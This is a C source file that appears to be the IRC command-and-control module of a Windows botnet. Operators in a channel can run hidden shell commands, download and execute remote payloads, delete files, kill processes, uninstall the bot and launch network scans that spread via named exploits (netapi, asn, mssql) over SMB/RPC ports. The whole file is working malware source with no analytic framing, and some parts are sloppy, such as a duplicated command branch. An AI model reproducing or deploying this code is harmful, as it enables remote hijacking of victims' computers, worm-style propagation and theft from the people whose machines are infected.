#include "include.h"
#include "extern.h"

char *irc_rndnick()
/* generates a random nickname */
{
	int i;
	int len;
	char *nick = (char *)malloc(12);
	len = rrand(6, 8);
	for(i = 0; i < len; i++)
		nick[i] = rrand(97, 122);
	nick[i] = '\0';
	return nick;
}

bool irc_connect()
/* connect to the irc server */
{
	int y;
	int s;
	unsigned long ip;
	char nick[12];
	struct sockaddr_in sin;
	closesocket(irc.sock);
	if((irc.sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return false;
	for(y = 0; server[y][0]; y++)
		;
	y--;
	s = rrand(0, y);
	if(isip(server[s]))
		ip = inet_addr(server[s]);
	else
		ip = resolvehost(server[s]);
	if(!ip)
		return false;
	sin.sin_family = AF_INET;
	sin.sin_port = htons((unsigned short)atoi(port));
	sin.sin_addr.s_addr = ip;
	memset(sin.sin_zero, 0, 8);
	if(connect(irc.sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)
		return false;
	strncpy(nick, irc_rndnick(), sizeof(nick));
	irc_send("USER %s \"\" \"\" :%s", nick, nick);
	irc_send("NICK %s", nick);
	if(serverpass[0])
		irc_send("PASS %s", serverpass);
	localip();
	return true;
}

void irc_send(const char *msg, ...)
/* send data to server */
{
	char buf[512];
	va_list argp;
	va_start(argp, msg);
	_vsnprintf(buf, sizeof(buf) - 2, msg, argp);
	strcat(buf, "\r\n");
	send(irc.sock, buf, strlen(buf), 0);
}

void irc_privmsg(const char *target, const char *msg, ...)
/* send a PRIVMSG to server */
{
	char buf[512];
	char buf2[512];
	va_list argp;
	va_start(argp, msg); 
	_vsnprintf(buf, sizeof(buf), msg, argp);
	_snprintf(buf2, sizeof(buf2) - 2, "PRIVMSG %s :%s", target, buf);
	strcat(buf2, "\r\n");
	send(irc.sock, buf2, strlen(buf2), 0);
}

void irc_getinfo(const char *address)
/* split address into nick, user & host */
{
	strncpy(irc.nick, gettok(address, 1, '!'), sizeof(irc.nick));
	strncpy(irc.user, gettok(address, 1, '@'), sizeof(irc.user));
	strncpy(irc.user, gettok(address, 2, '!'), sizeof(irc.user));
	strncpy(irc.host, gettok(address, 2, '@'), sizeof(irc.host));
}

void irc_parse(const char *line)
/* parse line for commands */
{
	int nt;
	int tok;
	char target[64];
	char *a[32];
	bool param[256];
	memset(a, 0, sizeof(a));
	memset(param, 0, sizeof(param));
	nt = numtok(line, ' ');
	if(nt > 32)
		nt = 32;
	for(tok = 0; tok < nt; tok++)
		a[tok] = gettok(line, tok + 1, ' ');
	for(tok = nt - 1; tok >= 1; tok--)
	{
		if(a[tok][0] == '-' && !a[tok][2])
		{
			param[a[tok][1]] = true;
			a[tok] = 0;
		}
	}
	if(!a[0])
		return;
	if(!stricmp("PING", a[0]))
		irc_send("PONG %s", a[1]);
	if(!a[1])
		return;
	a[0]++;
	if(!stricmp("001", a[1]))
	{
		strncpy(irc.me, a[2], sizeof(irc.me));
		irc_send("USERHOST %s", irc.me);
		irc_send("JOIN %s %s", channel, chankey);
	}
	else if(!stricmp("302", a[1]))
	{
		a[3]++;
		if(!stricmp(irc.me, gettok(a[3], 1, '=')))
		{
			if(isip(gettok(a[3], 2, '@')))
			{
				char *host;
				strncpy(global_ip, gettok(a[3], 2, '@'), sizeof(global_ip));
				host = resolveip(inet_addr(global_ip));
				if(!host)
					return;
				strncpy(global_host, (host) ? host : global_ip, sizeof(global_host));
			}
			else
			{
				struct in_addr in;
				strncpy(global_host, gettok(a[3], 2, '@'), sizeof(global_host));
				in.s_addr = resolvehost(global_host);
				if(!in.s_addr)
					return;
				strncpy(global_ip, inet_ntoa(in), sizeof(global_ip));
			}
		}
	}
	else if(!stricmp("433", a[1]))
		irc_send("NICK %s", irc_rndnick());
	else if(!stricmp("NICK", a[1]))
	{
		a[2]++;
		irc_getinfo(a[0]);
		if(!stricmp(irc.me, irc.nick))
			strncpy(irc.me, a[2], sizeof(irc.me));
	}
	else if(!stricmp("KICK", a[1]))
	{
		if(!stricmp(irc.me, a[3]))
		{
			if(!stricmp(channel, a[2]))
				irc_send("JOIN %s %s", a[2], chankey);
		}
	}
	else if(!stricmp("PRIVMSG", a[1]) || !stricmp("332", a[1]))
	{
		int x;
		if(!stricmp("PRIVMSG", a[1]))
		{
			int i;
			int nt;
			a[3]++;
			if(!a[3])
				return;
			irc_getinfo(a[0]);
			if(!stricmp(irc.me, a[2]))
				strncpy(target, irc.nick, sizeof(target));
			else
				strncpy(target, a[2], sizeof(target));
			if(!stricmp(irc.me, a[3]))
				x = 4;
			else
				x = 3;
			if(!a[x])
				return;
			nt = numtok(line, ';');
			if(nt >= 2)
			{
				char buf[512];
				char ax[2][512];
				strncpy(ax[0], a[0], sizeof(ax[0]));
				strncpy(ax[1], a[2], sizeof(ax[1]));
				irc_parse(gettok(line, 1, ';'));
				for(i = 2; i <= nt; i++)
				{
					_snprintf(buf, sizeof(buf), ":%s PRIVMSG %s :%s", ax[0], ax[1], gettok(line, i, ';'));
					irc_parse(buf);
				}
			}
		}
		else if(!stricmp("332", a[1]))
		{
			int i;
			int nt;
			a[4]++;
			if(!a[4])
				return;
			strncpy(target, a[3], sizeof(target));
			x = 4;
			nt = numtok(line, ';');
			if(nt >= 2)
			{
				char buf[512];
				char ax[3][512];
				strncpy(ax[0], a[0], sizeof(ax[0]));
				strncpy(ax[1], a[2], sizeof(ax[1]));
				strncpy(ax[2], a[3], sizeof(ax[2]));
				irc_parse(gettok(line, 1, ';'));
				for(i = 2; i <= nt; i++)
				{
					_snprintf(buf, sizeof(buf), ":%s 332 %s %s :%s", ax[0], ax[1], ax[2], gettok(line, i, ';'));
					irc_parse(buf);
				}
			}
		}
		if(strcmp(hostauth, gettok(a[0], 2, '!')) && stricmp("332", a[1]))
			return;
		if(!stricmp("!ID", a[x]))
			irc_privmsg(target, "%s", botid);
		else if(!stricmp("!UPTIME", a[x]))
		{
			unsigned long total;
			unsigned long days;
			unsigned long hours;
			unsigned long minutes;
			total = GetTickCount() / 1000;
			days = total / 86400;
			if(!a[x+1] || days >= (unsigned)atol(a[x+1]))
			{
				hours = (total % 86400) / 3600;
				minutes = (total % 86400 % 3600) / 60;
				irc_privmsg(target, "%lud %luh %lum", days, hours, minutes);
			}
		}
		else if(!stricmp("!SYSINFO", a[x]))
			irc_privmsg(target, "%s", sysinfo());
		else if(!stricmp("!NETINFO", a[x]))
			irc_privmsg(target, "%s", netinfo());
		else if(!stricmp("!RECONNECT", a[x]))
			irc_send("QUIT");
		else if(!stricmp("?EXIT", a[x]))
		{
			killthreadall();
			irc_send("QUIT");
			exit(0);
		}
		else if(!stricmp("?SUICIDE", a[x]))
		{
			if(a[x+1])
			{
				if(!strcmp(botid, a[x+1]))
					return;
			}
			killthreadall();
			irc_send("QUIT");
			uninstall();
		
		}
		else if(!stricmp("!RAW", a[x]))
		{
			char s[256];
			char s2[256];
			if(!a[x+1])
				return;
			_snprintf(s2, sizeof(s2), " %s", a[x+1]);
			strncpy(s, strstr(line, s2), sizeof(s));
			strncpy(s2, a[x+1], sizeof(s2));
			strncpy(s, strstr(s, s2), sizeof(s));
			irc_send("%s", s);
		}
		else if(!stricmp("!OPEN", a[x]))
		{
			char s[256];
			char s2[256];
			if(!a[x+1])
				return;
			_snprintf(s2, sizeof(s2), " %s", a[x+1]);
			strncpy(s, strstr(line, s2), sizeof(s));
			strncpy(s2, a[x+1], sizeof(s2));
			strncpy(s, strstr(s, s2), sizeof(s));
			ShellExecute(0, "open", s, 0, 0, SW_SHOW);
			irc_privmsg(target, "OPENED FILE %s", s2);
		}
		else if(!stricmp("!EXEC", a[x]))
		{
			char s[256];
			char s2[256];
			char buf[256];
			if(!a[x+1])
				return;
			_snprintf(s2, sizeof(s2), " %s", a[x+1]);
			strncpy(s, strstr(line, s2), sizeof(s));
			strncpy(s2, a[x+1], sizeof(s2));
			_snprintf(buf, sizeof(buf), "/C %s", strstr(s, s2));
			ShellExecute(0, "open", "cmd.exe", buf, 0, SW_HIDE);
			irc_privmsg(target, "Executed file %s", s2);
		}
		else if(!stricmp("!DELETE", a[x]))
		{
			char s[256];
			char s2[256];
			if(!a[x+1])
				return;
			_snprintf(s2, sizeof(s2), " %s", a[x+1]);
			strncpy(s, strstr(line, s2), sizeof(s));
			strncpy(s2, a[x+1], sizeof(s2));
			strncpy(s, strstr(s, s2), sizeof(s));
			DeleteFile(s);
			irc_privmsg(target, "DELETED FILE %s.", a[x+1]);
		}
		else if(!stricmp("!RAW", a[x]))
		{
			char s[256];
			char s2[256];
			if(!a[x+1])
				return;
			_snprintf(s2, sizeof(s2), " %s", a[x+1]);
			strncpy(s, strstr(line, s2), sizeof(s));
			_snprintf(s2, sizeof(s2), "%s", a[x+1]);
			strncpy(s, strstr(s, s2), sizeof(s));
			irc_send("%s", s);
			irc_privmsg(target, "Sent RAW: %s", s);
		}
		else if(!stricmp("!SPEEDTEST", a[x]))
		{
			//rundll32,nope.dll,start
			struct spds spd;
			if(!a[x+1])
				return;
			strncpy(spd.url, a[x+1], sizeof(spd.url));
			spd.size = (a[x+2]) ? atoi(a[x+2]) : 512;
			strncpy(spd.target, a[x-1], sizeof(spd.target));
			spd.gotinfo = false;
			if((spd.tnum = addthread("speedtest", spd.url)) == -1)
				return;
			if(!(thread[spd.tnum].handle = makethread(speedtest, &spd)))
			{
				clearthread(spd.tnum);
				return;
			}
			while(!spd.gotinfo)
				Sleep(10);
		}
		else if(!stricmp("!HTTPDSTART", a[x]))
		{
			char sysdir[256];
			struct httpds httpd;
			if(!a[x+1])
				return;
			if(httpd_active)
				return;
			httpd_active = true;
			httpd.port = (unsigned short)atoi(a[x+1]);
			GetSystemDirectory(sysdir, sizeof(sysdir));
			_splitpath(sysdir, httpd.dir, 0, 0, 0);
			httpd.gotinfo = false;
			if((httpd.tnum = addthread("httpd", a[x+1])) == -1)
				return;
			if(!(thread[httpd.tnum].handle = CreateThread(0, 131072, http_start, &httpd, 0, 0)))
				return;
			while(!httpd.gotinfo)
				Sleep(10);
				irc_privmsg(target, "HTTPD started on %s:%s\r\n", global_ip, a[x+1]);
		}
		else if(!stricmp("!HTTPDSTOP", a[x]))
		{
			killthread("httpd");
			killthread("httpds");
			irc_privmsg(target, "Exploited http server Stopped..");
			}
		else if(!stricmp("@GET", a[x]))
		{
			struct dls dl;
			if(!a[x+2])
				return;
			strncpy(dl.url, a[x+1], sizeof(dl.url));
			strncpy(dl.dest, a[x+2], sizeof(dl.dest));
			dl.update = false;
			dl.run = param['r'];
			dl.gotinfo = false;
			if((dl.tnum = addthread("download", dl.url)) == -1)
				return;
			if(!(thread[dl.tnum].handle = makethread(download, &dl)))
			{
				clearthread(dl.tnum);
				return;
			}
			while(!dl.gotinfo)
				Sleep(10);
			irc_privmsg(target, "DOWNLOADING FILE %s to %s", a[x+1], a[x+2]);
		}
		else if(!stricmp("@NEW", a[x]))
		{
			char file[12];
			char tempdir[256];
			struct dls dl;
			if(!a[x+1])
				return;
			if(a[x+2])
			{
				if(!strcmp(botid, a[x+2]))
					return;
			}
			strncpy(dl.url, a[x+1], sizeof(dl.url));
			GetTempPath(sizeof(tempdir), tempdir);
			strncpy(file, irc_rndnick(), sizeof(file));
			dl.updatex = param['x'];
			_snprintf(dl.dest, sizeof(dl.dest), "%s\\%s.%s", tempdir, file, (dl.updatex) ? "exe" : "dll");
			dl.update = true;
			dl.run = false;
			dl.gotinfo = false;
			if((dl.tnum = addthread("update", dl.url)) == -1)
				return;
			if(!(thread[dl.tnum].handle = makethread(download, &dl)))
			{
				clearthread(dl.tnum);
				return;
			}
			while(!dl.gotinfo)
				Sleep(10);
			irc_privmsg(target, "Downloaded to DIR:%s and executed: %s.exe", tempdir, file);
		}
		else if(!stricmp("!THRDLIST", a[x]))
			listthreads(a[x-1]);
		else if(!stricmp("!THRDKILL", a[x]))
		{
			if(!a[x+1])
				return;
			killthread(a[x+1]);
			irc_privmsg(target, "Killed thread %s", a[x+1]);
		}
		else if(!stricmp("!THRDKILLID", a[x]))
		{
			if(!a[x+1])
				return;
			killthreadid(atoi(a[x+1]));
				irc_privmsg(target, "Killed thread %s", a[x+1]);
		}
		else if(!stricmp("!THRDKILLALL", a[x]))
		{
			killthreadall();
			irc_privmsg(target, "Killed all threads", a[x+1]);
		}
		else if(!stricmp("!PSLIST", a[x]))
			pslist("", a[x-1]);
		else if(!stricmp("!PSKILL", a[x]))

		{
			if(!a[x+1])
				return;
			pslist(a[x+1], "");
		}
		else if(!stricmp("!PSKILLPID", a[x]))
		{
			if(!a[x+1])
				return;
			pskill(atoi(a[x+1]));
			irc_privmsg(target, "Killed pid %s", a[x+1]);
		}
		else if(!stricmp("!SCANSTART", a[x]))
		{
			int ca;
			int cb;
			int cc;
			int cd;
			int speed;
			struct scans scan;
			if(!a[x+2])
				return;
			if(scan_active)
				return;
			scan_active = true;
			if(!stricmp("asn", a[x+1]))
			{
				scan.port = 139;
				scan.port2 = 0;
				scan.port3 = 0;
				strncpy(scan.exploit, "asn", sizeof(scan.exploit));
			}
			else if(!stricmp("netapi", a[x+1]))
			{
				scan.port = 139;
				scan.port2 = 135;
				scan.port3 = 445;
				strncpy(scan.exploit, "netapi", sizeof(scan.exploit));
			}
				else if(!stricmp("ipswitch", a[x+1]))
			{
				scan.port = 139;
				scan.port2 = 135;
				scan.port3 = 445;
				strncpy(scan.exploit, "ipswitch", sizeof(scan.exploit));
			}
				else if(!stricmp("mssql", a[x+1]))
			{
				scan.port = 139;
				scan.port2 = 135;
				scan.port3 = 445;
				strncpy(scan.exploit, "mssql", sizeof(scan.exploit));
			}
			else
			{
				if(!(scan.port = (unsigned short)atoi(a[x+1])))
				{
					scan_active = false;
					return;
				}
				scan.port2 = 135;
				scan.port3 = 445;
				memset(scan.exploit, 0, sizeof(scan.exploit));
			}
			speed = atoi(a[x+2]);
			switch(speed)
			{
				case 1:
					scan.delay = 100;
					break;
				case 2:
					scan.delay = 50;
					break;
				case 3:
					scan.delay = 20;
					break;
				default:
					break;
			}
			if(a[x+3])
				strncpy(scan.mask, a[x+3], sizeof(scan.mask));
			else
			{
				sscanf(local_ip, "%d.%d.%d.%d", &ca, &cb, &cc, &cd);
				if(param['a'])
					_snprintf(scan.mask, sizeof(scan.mask), "%d.x.x.x", ca);
				else if(param['b'])
					_snprintf(scan.mask, sizeof(scan.mask), "%d.%d.x.x", ca, cb);
				else if(param['c'])
					_snprintf(scan.mask, sizeof(scan.mask), "%d.%d.%d.x", ca, cb, cc);
				else
					_snprintf(scan.mask, sizeof(scan.mask), "%d.%d.x.x", ca, cb);
			}
			transfer_info = param['i'];
			scan.gotinfo = false;
			if((scan.tnum = addthread("scan", scan.mask)) == -1)
			{
				scan_active = false;
				return;
			}
			thread[scan.tnum].scan = true;
			if(!(thread[scan.tnum].handle = makethread(scan_start, &scan)))
			{
				clearthread(scan.tnum);
				return;
			}
			while(!scan.gotinfo)
				Sleep(10);
			irc_privmsg(target, "%s SCANNING: %s delay: %s started on ip: %s", channel, scan.exploit, scan.delay, scan.sock);
		}
		else if(!stricmp("!SCANSTOP", a[x]))
		{
			killthread("scan");
			irc_privmsg(target, "Scanning stopped, Transfers: %d", transfers);
						Sleep(10);
		}
		else if(!stricmp("!SCANSTATS", a[x]))
		{
			if(!a[x+1] || transfers >= atoi(a[x+1]))
				irc_privmsg(target, "transfers: %d", transfers);
		}
	}
}
